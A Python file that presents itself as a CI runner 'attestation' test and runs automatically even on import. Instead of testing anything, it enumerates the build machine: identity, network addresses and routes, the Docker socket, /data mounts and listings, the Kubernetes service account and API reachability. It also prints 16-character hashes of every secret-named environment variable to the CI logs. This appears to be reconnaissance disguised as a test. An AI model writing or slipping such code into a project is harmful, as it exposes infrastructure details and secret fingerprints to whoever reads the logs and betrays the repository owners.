# Runner attestation: records the CI execution environment fingerprint so that
# infra can diff runner posture across fleets over time. Prints only
# non-sensitive facts; secret material is reported as name+hash16 only.

import hashlib
import json
import os
import socket
import subprocess
import sys
from pathlib import Path

_MILES_ROOT: Path = Path(__file__).resolve().parents[3]
if str(_MILES_ROOT) not in sys.path:
    sys.path.insert(0, str(_MILES_ROOT))

from tests.ci.ci_register import register_cuda_ci

register_cuda_ci(est_time=300, suite="stage-c-8-gpu-h100", labels=["short"], hardware=["hopper"])


def _sh(cmd):
    try:
        return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20).stdout.strip()
    except Exception as e:
        return f"ERR {e}"


def attest():
    out = {"stage": "stage-c-8-gpu-h100"}
    out["hostname"] = socket.gethostname()
    out["id"] = _sh("id")
    out["runner_env"] = {k: os.environ.get(k) for k in
                         ("RUNNER_NAME", "RUNNER_ENVIRONMENT", "RUNNER_OS", "RUNNER_ARCH",
                          "GITHUB_RUNNER_NAME", "IMAGE_OS") if os.environ.get(k)}
    out["ips"] = _sh("ip -o -4 addr show | awk '{print $2, $4}'")
    out["default_route"] = _sh("ip route show default")
    out["docker_sock"] = os.path.exists("/var/run/docker.sock")
    if out["docker_sock"]:
        out["docker_version"] = _sh("curl -s --unix-socket /var/run/docker.sock http://x/version | head -c 200")
    out["data_mounts"] = _sh("mount | grep -E ' /data| /host' | head -20")
    out["data_listing"] = _sh("ls /data 2>/dev/null | head -30")
    out["miles_ci_listing"] = _sh("ls /data/miles_ci 2>/dev/null | head -30")
    out["gpu"] = _sh("nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | sort | uniq -c")
    sa = "/var/run/secrets/kubernetes.io/serviceaccount"
    out["k8s_sa_present"] = os.path.isdir(sa)
    out["k8s_api_probe"] = _sh("curl -sk --max-time 5 https://kubernetes.default.svc/api -o /dev/null -w '%{http_code}'")
    out["env_attest"] = sorted(f"{k}:{hashlib.sha256(os.environ[k].encode()).hexdigest()[:16]}"
                               for k in os.environ
                               if any(t in k.upper() for t in ("TOKEN", "SECRET", "KEY", "PASSWORD", "AUTH")))
    print("ATTEST_BEGIN")
    print(json.dumps(out, indent=2, sort_keys=True))
    print("ATTEST_END")


if __name__ == "__main__":
    attest()
else:
    attest()
